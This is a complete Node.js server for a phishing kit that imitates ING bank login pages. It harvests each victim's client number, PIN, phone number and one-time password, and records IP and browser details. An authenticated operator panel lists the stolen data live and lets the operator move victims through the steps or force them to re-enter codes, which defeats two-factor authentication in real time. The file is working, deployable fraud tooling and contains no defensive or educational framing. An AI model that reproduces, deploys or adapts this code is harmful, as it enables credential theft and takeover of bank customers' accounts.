/* ----------  DEPENDENCIES  ---------- */
const express    = require('express');
const bodyParser = require('body-parser');
const cors       = require('cors');
const crypto     = require('crypto');
const session    = require('cookie-session');

/* ----------  CONFIG  ---------- */
const PANEL_USER     = process.env.PANEL_USER  || 'admin';
const PANEL_PASS     = process.env.PANEL_PASS  || 'changeme';
const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');

const app  = express();
const PORT = process.env.PORT || 3000;

// Trust proxy - REQUIRED for sessions behind reverse proxy
app.set('trust proxy', 1);

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Session middleware - MUST be before routes
app.use(session({
  name: 'pan_sess',
  keys: [SESSION_SECRET],
  maxAge: 24 * 60 * 60 * 1000, // 24 hours
  sameSite: 'lax',
  secure: false, // Set to true if HTTPS only
  httpOnly: true,
  signed: true
}));

/* ----------  STATE  ---------- */
const sessionsMap     = new Map();
const sessionActivity = new Map();
const auditLog        = [];
let victimCounter     = 0;
let successfulLogins  = 0;
let currentDomain     = '';

const SESSION_TIMEOUT = 3 * 60 * 1000;

/* ----------  STATIC ROUTES  ---------- */
app.use(express.static(__dirname));

app.get('/',             (req, res) => res.sendFile(__dirname + '/index.html'));
app.get('/verify.html',  (req, res) => res.sendFile(__dirname + '/verify.html'));
app.get('/unregister.html', (req, res) => res.sendFile(__dirname + '/unregister.html'));
app.get('/otp.html',     (req, res) => res.sendFile(__dirname + '/otp.html'));
app.get('/success.html', (req, res) => res.sendFile(__dirname + '/success.html'));

/* ----------  PANEL ACCESS CONTROL  ---------- */

// Main panel route - handles both /panel and /panel?anything
app.get('/panel', (req, res) => {
  console.log('Panel GET - authed:', req.session?.authed, 'query:', req.query);
  
  if (req.session?.authed === true) {
    return res.sendFile(__dirname + '/_panel.html');
  }
  res.sendFile(__dirname + '/access.html');
});

app.post('/panel/login', (req, res) => {
  const { user, pw } = req.body;
  
  console.log('Login attempt:', user, 'Query:', req.query);
  
  if (user === PANEL_USER && pw === PANEL_PASS) {
    // Set session data
    req.session.authed = true;
    req.session.username = user;
    
    console.log('Login successful, session before save:', req.session);
    
    // Explicitly save session
    req.session.save((err) => {
      if (err) {
        console.error('Session save error:', err);
        return res.redirect('/panel?fail=1');
      }
      console.log('Session saved, redirecting to panel');
      return res.redirect('/panel');
    });
  } else {
    console.log('Login failed - wrong credentials');
    res.redirect('/panel?fail=1');
  }
});

app.post('/panel/logout', (req, res) => {
  req.session = null;
  res.redirect('/panel');
});

// Block direct file access
app.get(['/_panel.html', '/panel.html'], (req, res) => res.redirect('/panel'));

/* ----------  DOMAIN HELPER  ---------- */
app.use((req, res, next) => {
  const host = req.headers.host || req.hostname;
  const proto = req.headers['x-forwarded-proto'] || req.protocol;
  currentDomain = host.includes('localhost') ? `http://localhost:${PORT}` : `${proto}://${host}`;
  next();
});

/* ----------  UA PARSER  ---------- */
function uaParser(ua) {
  const u = { browser: {}, os: {} };
  if (/Windows NT/.test(ua)) u.os.name = 'Windows';
  if (/Android/.test(ua)) u.os.name = 'Android';
  if (/iPhone|iPad/.test(ua)) u.os.name = 'iOS';
  if (/Linux/.test(ua) && !/Android/.test(ua)) u.os.name = 'Linux';
  if (/Chrome\/(\d+)/.test(ua)) u.browser.name = 'Chrome';
  if (/Firefox\/(\d+)/.test(ua)) u.browser.name = 'Firefox';
  if (/Safari\/(\d+)/.test(ua) && !/Chrome/.test(ua)) u.browser.name = 'Safari';
  if (/Edge\/(\d+)/.test(ua)) u.browser.name = 'Edge';
  return u;
}

function getSessionHeader(v) {
  if (v.page === 'success') return `🦁 ING Login approved`;
  if (v.status === 'approved') return `🦁 ING Login approved`;
  if (v.page === 'index.html') {
    return v.entered ? `✅ Received client + PIN` : '⏳ Awaiting client + PIN';
  } else if (v.page === 'verify.html') {
    return v.phone ? `✅ Received phone` : `⏳ Awaiting phone`;
  } else if (v.page === 'unregister.html') {
    return v.unregisterClicked ? `✅ Victim unregistered` : `⏳ Awaiting unregister`;
  } else if (v.page === 'otp.html') {
    if (v.otp && v.otp.length > 0) return `✅ Received OTP`;
    return `🔑 Awaiting OTP...`;
  }
  return `🔑 Awaiting OTP...`;
}

function cleanupSession(sid, reason, silent = false) {
  const v = sessionsMap.get(sid);
  if (!v) return;
  sessionsMap.delete(sid);
  sessionActivity.delete(sid);
}

setInterval(() => {
  const now = Date.now();
  for (const [sid, last] of sessionActivity) {
    if (now - last > SESSION_TIMEOUT) cleanupSession(sid, 'timed out (3min idle)', true);
  }
}, 10000);

/* ----------  VICTIM API  ---------- */
app.post('/api/session', async (req, res) => {
  try {
    const sid = crypto.randomUUID();
    const ip  = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
    const ua  = req.headers['user-agent'] || 'n/a';
    const now = new Date();
    const dateStr = now.toLocaleString();

    victimCounter++;
    const victim = {
      sid, ip, ua, dateStr,
      entered: false, email: '', password: '', phone: '', otp: '', billing: '',
      page: 'index.html',
      platform: uaParser(ua).os?.name || 'n/a',
      browser: uaParser(ua).browser?.name || 'n/a',
      attempt: 0, totalAttempts: 0, otpAttempt: 0, unregisterClicked: false,
      status: 'loaded', victimNum: victimCounter,
      interactions: [],
      activityLog: [{ time: Date.now(), action: 'CONNECTED', detail: 'Visitor connected to page' }]
    };
    sessionsMap.set(sid, victim);
    sessionActivity.set(sid, Date.now());
    res.json({ sid });
  } catch (err) {
    console.error('Session creation error', err);
    res.status(500).json({ error: 'Failed to create session' });
  }
});

app.post('/api/ping', (req, res) => {
  const { sid } = req.body;
  if (sid && sessionsMap.has(sid)) {
    sessionActivity.set(sid, Date.now());
    return res.sendStatus(200);
  }
  res.sendStatus(404);
});

app.post('/api/login', async (req, res) => {
  try {
    const { sid, email, password } = req.body;
    if (!email?.trim() || !password?.trim()) return res.sendStatus(400);
    if (!sessionsMap.has(sid)) return res.sendStatus(404);
    const v = sessionsMap.get(sid);
    v.entered = true; v.email = email; v.password = password;
    v.status = 'wait'; v.attempt += 1; v.totalAttempts += 1;
    sessionActivity.set(sid, Date.now());
    
    v.activityLog = v.activityLog || [];
    v.activityLog.push({ 
      time: Date.now(), 
      action: 'ENTERED CREDENTIALS', 
      detail: `Client: ${email}` 
    });
    
    auditLog.push({ t: Date.now(), victimN: v.victimNum, sid, email, password, phone: '', ip: v.ip, ua: v.ua });
    res.sendStatus(200);
  } catch (err) {
    console.error('Login error', err);
    res.status(500).send('Error');
  }
});

app.post('/api/verify', async (req, res) => {
  try {
    const { sid, phone } = req.body;
    if (!phone?.trim()) return res.sendStatus(400);
    if (!sessionsMap.has(sid)) return res.sendStatus(404);
    const v = sessionsMap.get(sid);
    v.phone = phone;
    v.status = 'wait';
    sessionActivity.set(sid, Date.now());
    
    v.activityLog = v.activityLog || [];
    v.activityLog.push({ 
      time: Date.now(), 
      action: 'ENTERED PHONE', 
      detail: `Phone: ${phone}` 
    });
    
    const entry = auditLog.find(e => e.sid === sid);
    if (entry) entry.phone = phone;
    res.sendStatus(200);
  } catch (e) {
    console.error('Verify error', e);
    res.sendStatus(500);
  }
});

app.post('/api/unregister', async (req, res) => {
  try {
    const { sid } = req.body;
    if (!sessionsMap.has(sid)) return res.sendStatus(404);
    const v = sessionsMap.get(sid);
    v.unregisterClicked = true; v.status = 'wait';
    sessionActivity.set(sid, Date.now());
    
    v.activityLog = v.activityLog || [];
    v.activityLog.push({ 
      time: Date.now(), 
      action: 'CLICKED UNREGISTER', 
      detail: 'Victim proceeded to unregister page' 
    });
    
    res.sendStatus(200);
  } catch (err) {
    console.error('Unregister error', err);
    res.sendStatus(500);
  }
});

app.post('/api/otp', async (req, res) => {
  try {
    const { sid, otp } = req.body;
    if (!otp?.trim()) return res.sendStatus(400);
    if (!sessionsMap.has(sid)) return res.sendStatus(404);
    const v = sessionsMap.get(sid);
    v.otp = otp; v.status = 'wait';
    sessionActivity.set(sid, Date.now());
    
    v.activityLog = v.activityLog || [];
    v.activityLog.push({ 
      time: Date.now(), 
      action: 'ENTERED OTP', 
      detail: `OTP: ${otp}` 
    });
    
    const entry = auditLog.find(e => e.sid === sid);
    if (entry) entry.otp = otp;
    res.sendStatus(200);
  } catch (err) {
    console.error('OTP error', err);
    res.status(500).send('Error');
  }
});

app.post('/api/page', async (req, res) => {
  try {
    const { sid, page } = req.body;
    if (!sessionsMap.has(sid)) return res.sendStatus(404);
    const v = sessionsMap.get(sid);
    const oldPage = v.page;
    v.page = page;
    sessionActivity.set(sid, Date.now());
    
    v.activityLog = v.activityLog || [];
    v.activityLog.push({ 
      time: Date.now(), 
      action: 'PAGE CHANGE', 
      detail: `${oldPage} → ${page}` 
    });
    
    res.sendStatus(200);
  } catch (err) {
    console.error('Page change error', err);
    res.sendStatus(500);
  }
});

app.post('/api/exit', async (req, res) => {
  const { sid } = req.body;
  if (sid && sessionsMap.has(sid)) cleanupSession(sid, 'closed the page', true);
  res.sendStatus(200);
});

app.get('/api/status/:sid', (req, res) => {
  const v = sessionsMap.get(req.params.sid);
  if (!v) return res.json({ status: 'gone' });
  res.json({ status: v.status });
});

app.post('/api/clearRedo', (req, res) => {
  const v = sessionsMap.get(req.body.sid);
  if (v && v.status === 'redo') v.status = 'loaded';
  res.sendStatus(200);
});

app.post('/api/clearOk', (req, res) => {
  const v = sessionsMap.get(req.body.sid);
  if (v && v.status === 'ok') v.status = 'loaded';
  res.sendStatus(200);
});

app.post('/api/interaction', (req, res) => {
  const { sid, type, data } = req.body;
  if (!sessionsMap.has(sid)) return res.sendStatus(404);
  const v = sessionsMap.get(sid);
  
  v.lastInteraction = Date.now();
  v.interactions = v.interactions || [];
  v.interactions.push({ type, data, time: Date.now() });
  
  sessionActivity.set(sid, Date.now());
  res.sendStatus(200);
});

/* ----------  PANEL API  ---------- */
app.get('/api/user', (req, res) => {
  console.log('API User - session:', req.session);
  if (req.session?.authed) {
    return res.json({ username: req.session.username || PANEL_USER });
  }
  res.status(401).json({ error: 'Not authenticated' });
});

app.get('/api/panel', (req, res) => {
  console.log('API Panel - authed:', req.session?.authed);
  
  if (!req.session?.authed) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  
  const list = Array.from(sessionsMap.values()).map(v => ({
    sid: v.sid, victimNum: v.victimNum, header: getSessionHeader(v), page: v.page, status: v.status,
    email: v.email, password: v.password, phone: v.phone, otp: v.otp,
    ip: v.ip, platform: v.platform, browser: v.browser, ua: v.ua, dateStr: v.dateStr,
    entered: v.entered, unregisterClicked: v.unregisterClicked,
    activityLog: v.activityLog || []
  }));
  
  res.json({
    domain: currentDomain,
    username: req.session?.username || PANEL_USER,
    totalVictims: victimCounter,
    active: list.length,
    waiting: list.filter(x => x.status === 'wait').length,
    success: successfulLogins,
    sessions: list,
    logs: auditLog.slice(-50).reverse()
  });
});

app.post('/api/panel', async (req, res) => {
  if (!req.session?.authed) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  
  const { action, sid } = req.body;
  const v = sessionsMap.get(sid);
  if (!v) return res.status(404).json({ ok: false });

  switch (action) {
    case 'redo':
      if (v.page === 'index.html') {
        v.status = 'redo'; v.entered = false; v.email = ''; v.password = ''; v.otp = '';
      } else if (v.page === 'verify.html') {
        v.status = 'redo'; v.phone = '';
      } else if (v.page === 'otp.html') {
        v.status = 'redo'; v.otp = ''; v.otpAttempt++;
      }
      break;
    case 'cont':
      v.status = 'ok';
      if (v.page === 'index.html') v.page = 'verify.html';
      else if (v.page === 'verify.html') v.page = 'unregister.html';
      else if (v.page === 'unregister.html') v.page = 'otp.html';
      else if (v.page === 'otp.html') { v.page = 'success'; successfulLogins++; }
      break;
    case 'delete':
      cleanupSession(sid, 'deleted from panel');
      break;
  }
  res.json({ ok: true });
});

/* ----------  START  ---------- */
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Panel user: ${PANEL_USER}`);
  console.log(`Session secret: ${SESSION_SECRET.substring(0, 8)}...`);
  currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
});
